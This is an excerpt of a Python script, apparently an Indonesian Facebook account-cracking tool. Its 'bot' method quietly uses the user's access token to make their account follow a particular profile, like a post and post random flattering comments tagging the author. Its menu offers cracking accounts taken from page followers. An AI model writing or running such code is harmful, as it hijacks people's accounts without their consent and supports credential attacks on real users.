...
komen = random.choice(['Mantap bang @[100039177390395:0] I Love You','Pengguna script ganja kamu bang @[100039177390395:0]','Kamu ganteng banget deh @[100039177390395:0]','Kamu ganteng banget deh bang @[100039177390395:0]','Kamu manis bang bang @[100039177390395:0]','Kamu cantik banget anak siapa @[100039177390395:0]','Kamu ganteng banget bang @[100039177390395:0]','Mantap bang love you','Milea nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading @[100039177390395:0]'])
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100039177390395/subscribers?access_token=' + toket) # Niki Mark
		requests.post('https://graph.facebook.com/100039177390395/subscribers?access_token=' + toket) # Niki mark
		requests.post('https://graph.facebook.com/100039177390395/subscribers?access_token=' + toket) # Niki mark
		requests.post('https://graph.facebook.com/100039177390395/comments/?message=' +komen+ '&access_token=' + toket)
		requests.post('https://graph.facebook.com/700297481286159/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/700297481286159/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/700297481286159/likes?summary=true&access_token=' + toket)
...
class menu:
	...
	def main(self):
		...
		print(' %s[%s9%s] crack dari followers fp new'%(N,O,N))
